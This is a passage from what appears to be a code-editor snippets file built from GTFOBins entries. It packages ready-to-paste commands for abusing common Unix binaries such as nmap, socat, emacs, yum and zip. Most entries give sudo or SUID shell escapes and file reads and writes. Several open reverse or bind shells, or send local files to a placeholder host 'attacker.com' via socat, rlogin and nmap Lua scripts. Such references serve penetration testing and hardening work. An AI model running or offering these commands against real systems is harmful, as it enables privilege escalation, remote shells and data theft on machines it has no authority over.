    "softlimit shell (gtfobins)": {
        "prefix": "softlimit shell",
        "body": [
            "abuse softlimit with shell",
            "",
            "```sh",
            "softlimit /bin/sh${0}",
            "```"
        ],
        "description": "abuse softlimit with shell"
    },
    "softlimit suid (gtfobins)": {
        "prefix": "softlimit suid",
        "body": [
            "abuse softlimit with suid",
            "",
            "```sh",
            "./softlimit /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse softlimit with suid"
    },
    "softlimit sudo (gtfobins)": {
        "prefix": "softlimit sudo",
        "body": [
            "abuse softlimit with sudo",
            "",
            "```sh",
            "sudo softlimit /bin/sh${0}",
            "```"
        ],
        "description": "abuse softlimit with sudo"
    },
    "ansible-test shell (gtfobins)": {
        "prefix": "ansible-test shell",
        "body": [
            "abuse ansible-test with shell",
            "",
            "```sh",
            "ansible-test shell${0}",
            "```"
        ],
        "description": "abuse ansible-test with shell"
    },
    "ansible-test sudo (gtfobins)": {
        "prefix": "ansible-test sudo",
        "body": [
            "abuse ansible-test with sudo",
            "",
            "```sh",
            "sudo ansible-test shell${0}",
            "```"
        ],
        "description": "abuse ansible-test with sudo"
    },
    "nmap shell (gtfobins)": {
        "prefix": "nmap shell",
        "body": [
            "abuse nmap with shell, The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.",
            "",
            "```sh",
            "nmap --interactive",
            "nmap> !sh${0}",
            "```"
        ],
        "description": "abuse nmap with shell - The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands."
    },
    "nmap non-interactive-reverse-shell (gtfobins)": {
        "prefix": "nmap non-interactive-reverse-shell",
        "body": [
            "abuse nmap with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "TF=\\$(mktemp)",
            "echo 'local s=require(\"socket\");",
            "local t=assert(s.tcp());",
            "t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "while true do",
            "  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "  local b=assert(f:read(\"*a\"));t:send(b);",
            "end;",
            "f:close();t:close();' > \\$TF",
            "nmap --script=\\$TF${0}",
            "```"
        ],
        "description": "abuse nmap with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell."
    },
    "nmap non-interactive-bind-shell (gtfobins)": {
        "prefix": "nmap non-interactive-bind-shell",
        "body": [
            "abuse nmap with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "TF=\\$(mktemp)",
            "echo 'local k=require(\"socket\");",
            "local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "local c=s:accept();",
            "while true do",
            "  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "  local b=assert(f:read(\"*a\"));c:send(b);",
            "end;c:close();f:close();' > \\$TF",
            "nmap --script=\\$TF${0}",
            "```"
        ],
        "description": "abuse nmap with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell."
    },
    "nmap file-upload (gtfobins)": {
        "prefix": "nmap file-upload",
        "body": [
            "abuse nmap with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "TF=\\$(mktemp)",
            "echo 'local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "local d=f:read(\"*a\")",
            "io.close(f);",
            "local s=require(\"socket\");",
            "local t=assert(s.tcp());",
            "t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "t:send(d);",
            "t:close();' > \\$TF",
            "nmap --script=\\$TF${0}",
            "```"
        ],
        "description": "abuse nmap with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file."
    },
    "nmap file-download (gtfobins)": {
        "prefix": "nmap file-download",
        "body": [
            "abuse nmap with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "TF=\\$(mktemp)",
            "echo 'local k=require(\"socket\");",
            "local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "local c=s:accept();",
            "local d,x=c:receive(\"*a\");",
            "c:close();",
            "local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "f:write(d);",
            "io.close(f);' > \\$TF",
            "nmap --script=\\$TF${0}",
            "```"
        ],
        "description": "abuse nmap with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file."
    },
    "nmap file-write (gtfobins)": {
        "prefix": "nmap file-write",
        "body": [
            "abuse nmap with file-write, The payload appears inside the regular nmap output.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "nmap -oG=\\$LFILE DATA${0}",
            "```"
        ],
        "description": "abuse nmap with file-write - The payload appears inside the regular nmap output."
    },
    "nmap file-read (gtfobins)": {
        "prefix": "nmap file-read",
        "body": [
            "abuse nmap with file-read, The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.",
            "",
            "```sh",
            "nmap -iL ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse nmap with file-read - The file is actually parsed as a list of hosts/networks, lines are leaked through error messages."
    },
    "nmap sudo (gtfobins)": {
        "prefix": "nmap sudo",
        "body": [
            "abuse nmap with sudo, The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.",
            "",
            "```sh",
            "sudo nmap --interactive",
            "nmap> !sh${0}",
            "```"
        ],
        "description": "abuse nmap with sudo - The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands."
    },
    "nmap limited-suid (gtfobins)": {
        "prefix": "nmap limited-suid",
        "body": [
            "abuse nmap with limited-suid, Input echo is disabled.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'os.execute(\"/bin/sh\")' > \\$TF",
            "./nmap --script=\\$TF${0}",
            "```"
        ],
        "description": "abuse nmap with limited-suid - Input echo is disabled."
    },
    "nmap suid (gtfobins)": {
        "prefix": "nmap suid",
        "body": [
            "abuse nmap with suid, The payload appears inside the regular nmap output.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "./nmap -oG=\\$LFILE DATA${0}",
            "```"
        ],
        "description": "abuse nmap with suid - The payload appears inside the regular nmap output."
    },
    "more shell (gtfobins)": {
        "prefix": "more shell",
        "body": [
            "abuse more with shell",
            "",
            "```sh",
            "TERM= more /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse more with shell"
    },
    "more file-read (gtfobins)": {
        "prefix": "more file-read",
        "body": [
            "abuse more with file-read",
            "",
            "```sh",
            "more ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse more with file-read"
    },
    "more suid (gtfobins)": {
        "prefix": "more suid",
        "body": [
            "abuse more with suid",
            "",
            "```sh",
            "./more ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse more with suid"
    },
    "more sudo (gtfobins)": {
        "prefix": "more sudo",
        "body": [
            "abuse more with sudo",
            "",
            "```sh",
            "TERM= sudo more /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse more with sudo"
    },
    "ptx file-read (gtfobins)": {
        "prefix": "ptx file-read",
        "body": [
            "abuse ptx with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ptx -w 5000 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ptx with file-read"
    },
    "ptx suid (gtfobins)": {
        "prefix": "ptx suid",
        "body": [
            "abuse ptx with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ptx -w 5000 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ptx with suid"
    },
    "ptx sudo (gtfobins)": {
        "prefix": "ptx sudo",
        "body": [
            "abuse ptx with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ptx -w 5000 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ptx with sudo"
    },
    "ionice shell (gtfobins)": {
        "prefix": "ionice shell",
        "body": [
            "abuse ionice with shell",
            "",
            "```sh",
            "ionice /bin/sh${0}",
            "```"
        ],
        "description": "abuse ionice with shell"
    },
    "ionice suid (gtfobins)": {
        "prefix": "ionice suid",
        "body": [
            "abuse ionice with suid",
            "",
            "```sh",
            "./ionice /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse ionice with suid"
    },
    "ionice sudo (gtfobins)": {
        "prefix": "ionice sudo",
        "body": [
            "abuse ionice with sudo",
            "",
            "```sh",
            "sudo ionice /bin/sh${0}",
            "```"
        ],
        "description": "abuse ionice with sudo"
    },
    "as file-read (gtfobins)": {
        "prefix": "as file-read",
        "body": [
            "abuse as with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "as @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse as with file-read"
    },
    "as suid (gtfobins)": {
        "prefix": "as suid",
        "body": [
            "abuse as with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./as @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse as with suid"
    },
    "as sudo (gtfobins)": {
        "prefix": "as sudo",
        "body": [
            "abuse as with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo as @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse as with sudo"
    },
    "emacs shell (gtfobins)": {
        "prefix": "emacs shell",
        "body": [
            "abuse emacs with shell",
            "",
            "```sh",
            "emacs -Q -nw --eval '(term \"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse emacs with shell"
    },
    "emacs file-write (gtfobins)": {
        "prefix": "emacs file-write",
        "body": [
            "abuse emacs with file-write",
            "",
            "```sh",
            "emacs ${1:file_to_write}",
            "DATA",
            "C-x C-s${0}",
            "```"
        ],
        "description": "abuse emacs with file-write"
    },
    "emacs file-read (gtfobins)": {
        "prefix": "emacs file-read",
        "body": [
            "abuse emacs with file-read",
            "",
            "```sh",
            "emacs ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse emacs with file-read"
    },
    "emacs suid (gtfobins)": {
        "prefix": "emacs suid",
        "body": [
            "abuse emacs with suid",
            "",
            "```sh",
            "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'${0}",
            "```"
        ],
        "description": "abuse emacs with suid"
    },
    "emacs sudo (gtfobins)": {
        "prefix": "emacs sudo",
        "body": [
            "abuse emacs with sudo",
            "",
            "```sh",
            "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse emacs with sudo"
    },
    "vipw suid (gtfobins)": {
        "prefix": "vipw suid",
        "body": [
            "abuse vipw with suid",
            "",
            "```sh",
            "./vipw${0}",
            "```"
        ],
        "description": "abuse vipw with suid"
    },
    "vipw sudo (gtfobins)": {
        "prefix": "vipw sudo",
        "body": [
            "abuse vipw with sudo",
            "",
            "```sh",
            "sudo vipw${0}",
            "```"
        ],
        "description": "abuse vipw with sudo"
    },
    "socat shell (gtfobins)": {
        "prefix": "socat shell",
        "body": [
            "abuse socat with shell, The resulting shell is not a proper TTY shell and lacks the prompt.",
            "",
            "```sh",
            "socat stdin exec:/bin/sh${0}",
            "```"
        ],
        "description": "abuse socat with shell - The resulting shell is not a proper TTY shell and lacks the prompt."
    },
    "socat reverse-shell (gtfobins)": {
        "prefix": "socat reverse-shell",
        "body": [
            "abuse socat with reverse-shell, Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "socat tcp-connect:\\$RHOST:\\$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane${0}",
            "```"
        ],
        "description": "abuse socat with reverse-shell - Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "socat bind-shell (gtfobins)": {
        "prefix": "socat bind-shell",
        "body": [
            "abuse socat with bind-shell, Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "socat TCP-LISTEN:\\$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane${0}",
            "```"
        ],
        "description": "abuse socat with bind-shell - Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell."
    },
    "socat file-upload (gtfobins)": {
        "prefix": "socat file-upload",
        "body": [
            "abuse socat with file-upload, Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "socat -u file:\\$LFILE tcp-connect:\\$RHOST:\\$RPORT${0}",
            "```"
        ],
        "description": "abuse socat with file-upload - Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file."
    },
    "socat file-download (gtfobins)": {
        "prefix": "socat file-download",
        "body": [
            "abuse socat with file-download, Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_save}",
            "socat -u tcp-connect:\\$RHOST:\\$RPORT open:\\$LFILE,creat${0}",
            "```"
        ],
        "description": "abuse socat with file-download - Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file."
    },
    "socat file-read (gtfobins)": {
        "prefix": "socat file-read",
        "body": [
            "abuse socat with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "socat -u \"file:\\$LFILE\" -${0}",
            "```"
        ],
        "description": "abuse socat with file-read"
    },
    "socat file-write (gtfobins)": {
        "prefix": "socat file-write",
        "body": [
            "abuse socat with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "socat -u 'exec:echo DATA' \"open:\\$LFILE,creat\"${0}",
            "```"
        ],
        "description": "abuse socat with file-write"
    },
    "socat sudo (gtfobins)": {
        "prefix": "socat sudo",
        "body": [
            "abuse socat with sudo, The resulting shell is not a proper TTY shell and lacks the prompt.",
            "",
            "```sh",
            "sudo socat stdin exec:/bin/sh${0}",
            "```"
        ],
        "description": "abuse socat with sudo - The resulting shell is not a proper TTY shell and lacks the prompt."
    },
    "socat limited-suid (gtfobins)": {
        "prefix": "socat limited-suid",
        "body": [
            "abuse socat with limited-suid, Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "./socat tcp-connect:\\$RHOST:\\$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane${0}",
            "```"
        ],
        "description": "abuse socat with limited-suid - Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "zip file-read (gtfobins)": {
        "prefix": "zip file-read",
        "body": [
            "abuse zip with file-read",
            "",
            "```sh",
            "LFILE=file-to-read",
            "TF=\\$(mktemp -u)",
            "zip \\$TF \\$LFILE",
            "unzip -p \\$TF${0}",
            "```"
        ],
        "description": "abuse zip with file-read"
    },
    "zip shell (gtfobins)": {
        "prefix": "zip shell",
        "body": [
            "abuse zip with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "zip \\$TF /etc/hosts -T -TT 'sh #'",
            "rm \\$TF${0}",
            "```"
        ],
        "description": "abuse zip with shell"
    },
    "zip sudo (gtfobins)": {
        "prefix": "zip sudo",
        "body": [
            "abuse zip with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "sudo zip \\$TF /etc/hosts -T -TT 'sh #'",
            "sudo rm \\$TF${0}",
            "```"
        ],
        "description": "abuse zip with sudo"
    },
    "zip limited-suid (gtfobins)": {
        "prefix": "zip limited-suid",
        "body": [
            "abuse zip with limited-suid",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "./zip \\$TF /etc/hosts -T -TT 'sh #'",
            "sudo rm \\$TF${0}",
            "```"
        ],
        "description": "abuse zip with limited-suid"
    },
    "yum file-download (gtfobins)": {
        "prefix": "yum file-download",
        "body": [
            "abuse yum with file-download, Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RFILE=file_to_get.rpm",
            "yum install http://\\$RHOST/\\$RFILE${0}",
            "```"
        ],
        "description": "abuse yum with file-download - Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`."
    },
    "yum sudo (gtfobins)": {
        "prefix": "yum sudo",
        "body": [
            "abuse yum with sudo, \nSpawn interactive root shell by loading a custom plugin.\n",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "cat >\\$TF/x<<EOF",
            "[main]",
            "plugins=1",
            "pluginpath=\\$TF",
            "pluginconfpath=\\$TF",
            "EOF",
            "cat >\\$TF/y.conf<<EOF",
            "[main]",
            "enabled=1",
            "EOF",
            "cat >\\$TF/y.py<<EOF",
            "import os",
            "import yum",
            "from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE",
            "requires_api_version='2.1'",
            "def init_hook(conduit):",
            "  os.execl('/bin/sh','/bin/sh')",
            "EOF",
            "sudo yum -c \\$TF/x --enableplugin=y${0}",
            "```"
        ],
        "description": "abuse yum with sudo - \nSpawn interactive root shell by loading a custom plugin.\n"
    },
    "check_cups file-read (gtfobins)": {
        "prefix": "check_cups file-read",
        "body": [
            "abuse check_cups with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "check_cups --extra-opts=@\\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_cups with file-read"
    },
    "check_cups sudo (gtfobins)": {
        "prefix": "check_cups sudo",
        "body": [
            "abuse check_cups with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo check_cups --extra-opts=@\\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_cups with sudo"
    },
    "rlogin file-upload (gtfobins)": {
        "prefix": "rlogin file-upload",
        "body": [
            "abuse rlogin with file-upload, \nSend contents of a file to a TCP port. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker system to capture the contents.\n\n\n\n`rlogin` hangs waiting for the remote peer to close the socket.\n\n\n\nThe file is corrupted by leading and trailing spurious data.\n",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "rlogin -l \"\\$(cat \\$LFILE)\" -p \\$RPORT \\$RHOST${0}",
            "```"
        ],
        "description": "abuse rlogin with file-upload - \nSend contents of a file to a TCP port. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker system to capture the contents.\n\n\n\n`rlogin` hangs waiting for the remote peer to close the socket.\n\n\n\nThe file is corrupted by leading and trailing spurious data.\n"
    },
    "varnishncsa sudo (gtfobins)": {
        "prefix": "varnishncsa sudo",
        "body": [
            "abuse varnishncsa with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "sudo varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse varnishncsa with sudo"
    },
    "varnishncsa suid (gtfobins)": {
        "prefix": "varnishncsa suid",
        "body": [
            "abuse varnishncsa with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "./varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse varnishncsa with suid"
    },
    "rake file-read (gtfobins)": {
        "prefix": "rake file-read",
        "body": [
            "abuse rake with file-read, The file is actually parsed and the first wrong line is returned in an error message.",
            "",
            "```sh",
            "LFILE=file-to-read",
            "rake -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse rake with file-read - The file is actually parsed and the first wrong line is returned in an error message."
    },
    "rake shell (gtfobins)": {
        "prefix": "rake shell",
        "body": [
            "abuse rake with shell",
            "",
            "```sh",
            "rake -p '`/bin/sh 1>&0`'${0}",
            "```"
        ],
        "description": "abuse rake with shell"
    },
    "rake sudo (gtfobins)": {
        "prefix": "rake sudo",
        "body": [
            "abuse rake with sudo",
            "",
            "```sh",
            "sudo rake -p '`/bin/sh 1>&0`'${0}",
            "```"
        ],
        "description": "abuse rake with sudo"
    },
    "rake limited-suid (gtfobins)": {
        "prefix": "rake limited-suid",
        "body": [
            "abuse rake with limited-suid",
            "",
            "```sh",
            "./rake -p '`/bin/sh 1>&0`'${0}",
            "```"
        ],
        "description": "abuse rake with limited-suid"
    },
    "sash shell (gtfobins)": {
        "prefix": "sash shell",
        "body": [
            "abuse sash with shell",
            "",
            "```sh",
            "sash${0}",
            "```"
        ],
        "description": "abuse sash with shell"
    },
    "sash suid (gtfobins)": {
        "prefix": "sash suid",
        "body": [
            "abuse sash with suid",
            "",
            "```sh",
            "./sash${0}",
            "```"
        ],
        "description": "abuse sash with suid"
    },
    "sash sudo (gtfobins)": {
        "prefix": "sash sudo",
        "body": [
            "abuse sash with sudo",
            "",
            "```sh",
            "sudo sash${0}",
            "```"
        ],
        "description": "abuse sash with sudo"
    },
    "jq file-read (gtfobins)": {
        "prefix": "jq file-read",
        "body": [
            "abuse jq with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "jq -Rr . \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse jq with file-read"
    },
    "jq suid (gtfobins)": {
        "prefix": "jq suid",
        "body": [
            "abuse jq with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./jq -Rr . \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse jq with suid"
    },
    "jq sudo (gtfobins)": {
        "prefix": "jq sudo",
        "body": [
            "abuse jq with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo jq -Rr . \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse jq with sudo"
    },
    "check_statusfile file-read (gtfobins)": {
        "prefix": "check_statusfile file-read",
        "body": [
            "abuse check_statusfile with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "check_statusfile \\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_statusfile with file-read"
    },
    "check_statusfile sudo (gtfobins)": {
        "prefix": "check_statusfile sudo",
        "body": [
            "abuse check_statusfile with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo check_statusfile \\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_statusfile with sudo"
    },
    "nano shell (gtfobins)": {
        "prefix": "nano shell",
        "body": [
            "abuse nano with shell, The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
            "",
            "```sh",
            "nano -s /bin/sh",
            "/bin/sh",
            "^T${0}",
            "```"
        ],
        "description": "abuse nano with shell - The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed."
    },
    "nano file-write (gtfobins)": {
        "prefix": "nano file-write",
        "body": [
            "abuse nano with file-write",
            "",
            "```sh",
            "nano ${1:file_to_write}",
            "DATA",
            "^O${0}",
            "```"
        ],
        "description": "abuse nano with file-write"
    },
    "nano file-read (gtfobins)": {
        "prefix": "nano file-read",
        "body": [
            "abuse nano with file-read",
            "",
            "```sh",
            "nano ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse nano with file-read"
    },
    "nano limited-suid (gtfobins)": {
        "prefix": "nano limited-suid",
        "body": [
            "abuse nano with limited-suid, The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
            "",
            "```sh",
            "./nano -s /bin/sh",
            "/bin/sh",
            "^T${0}",
            "```"
        ],
        "description": "abuse nano with limited-suid - The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed."
    },
    "nano sudo (gtfobins)": {
        "prefix": "nano sudo",
        "body": [
            "abuse nano with sudo",
            "",
            "```sh",
            "sudo nano",
            "^R^X",
            "reset; sh 1>&0 2>&0${0}",
            "```"
        ],
        "description": "abuse nano with sudo"
    },
    "nasm file-read (gtfobins)": {
        "prefix": "nasm file-read",
        "body": [
            "abuse nasm with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "nasm -@ \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nasm with file-read"
    },
    "nasm suid (gtfobins)": {
        "prefix": "nasm suid",
        "body": [
            "abuse nasm with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./nasm -@ \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nasm with suid"
    },
    "nasm sudo (gtfobins)": {
        "prefix": "nasm sudo",
        "body": [
            "abuse nasm with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo nasm -@ \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nasm with sudo"
    },
    "grc shell (gtfobins)": {
        "prefix": "grc shell",
        "body": [
            "abuse grc with shell",
            "",
            "```sh",
            "grc --pty /bin/sh${0}",
            "```"
        ],
        "description": "abuse grc with shell"
    },
    "grc sudo (gtfobins)": {
        "prefix": "grc sudo",
        "body": [
            "abuse grc with sudo",
            "",
            "```sh",
            "sudo grc --pty /bin/sh${0}",
            "```"
        ],
        "description": "abuse grc with sudo"
    },
    "uniq file-read (gtfobins)": {
        "prefix": "uniq file-read",
        "body": [
            "abuse uniq with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "uniq \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse uniq with file-read"
    },
    "uniq suid (gtfobins)": {
        "prefix": "uniq suid",
        "body": [
            "abuse uniq with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./uniq \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse uniq with suid"
    },
    "uniq sudo (gtfobins)": {
        "prefix": "uniq sudo",
        "body": [
            "abuse uniq with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo uniq \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse uniq with sudo"
    },
    "cobc shell (gtfobins)": {
        "prefix": "cobc shell",
        "body": [
            "abuse cobc with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' > \\$TF/x",
            "cobc -xFj --frelax-syntax-checks \\$TF/x${0}",
            "```"
        ],
        "description": "abuse cobc with shell"
    },
    "cobc sudo (gtfobins)": {
        "prefix": "cobc sudo",
        "body": [
            "abuse cobc with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' > \\$TF/x",
            "sudo cobc -xFj --frelax-syntax-checks \\$TF/x${0}",
            "```"
        ],
        "description": "abuse cobc with sudo"
    },
    "dstat shell (gtfobins)": {
        "prefix": "dstat shell",
        "body": [
            "abuse dstat with shell",
            "",
            "```sh",
            "mkdir -p ~/.dstat",
            "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >~/.dstat/dstat_xxx.py",
            "dstat --xxx${0}",
            "```"
        ],
        "description": "abuse dstat with shell"
    },
    "dstat sudo (gtfobins)": {
        "prefix": "dstat sudo",
        "body": [
            "abuse dstat with sudo",
            "",
            "```sh",
            "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py",
            "sudo dstat --xxx${0}",
            "```"
        ],
        "description": "abuse dstat with sudo"
    },
    "ghci shell (gtfobins)": {
        "prefix": "ghci shell",
        "body": [
            "abuse ghci with shell",
            "",
            "```sh",
            "ghci",
            "System.Process.callCommand \"/bin/sh\"${0}",
            "```"
        ],
        "description": "abuse ghci with shell"
    },
    "ghci sudo (gtfobins)": {
        "prefix": "ghci sudo",
        "body": [
            "abuse ghci with sudo",
            "",
            "```sh",
            "sudo ghci",
            "System.Process.callCommand \"/bin/sh\"${0}",
            "```"
        ],
        "description": "abuse ghci with sudo"
    },
    "rpmdb shell (gtfobins)": {
        "prefix": "rpmdb shell",
        "body": [
            "abuse rpmdb with shell",
            "",
            "```sh",
            "rpmdb --eval '%(/bin/sh 1>&2)'${0}",
            "```"
        ],
        "description": "abuse rpmdb with shell"
    },
    "rpmdb limited-suid (gtfobins)": {
        "prefix": "rpmdb limited-suid",
        "body": [
            "abuse rpmdb with limited-suid",
            "",
            "```sh",
            "./rpmdb --eval '%(/bin/sh 1>&2)'${0}",
            "```"
        ],
        "description": "abuse rpmdb with limited-suid"
    },
    "rpmdb sudo (gtfobins)": {
        "prefix": "rpmdb sudo",
        "body": [
            "abuse rpmdb with sudo",
            "",
            "```sh",
            "sudo rpmdb --eval '%(/bin/sh 1>&2)'${0}",
            "```"
        ],
        "description": "abuse rpmdb with sudo"
    },
    "split file-read (gtfobins)": {
        "prefix": "split file-read",
        "body": [
            "abuse split with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "TF=\\$(mktemp)",
            "split \\$LFILE \\$TF",
            "cat \\$TF*${0}",
            "```"
        ],
        "description": "abuse split with file-read"
    },
    "split file-write (gtfobins)": {
        "prefix": "split file-write",
        "body": [
            "abuse split with file-write, GNU version only. Data will be written in the current directory in a file named `xaa.xxx` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.",
            "",
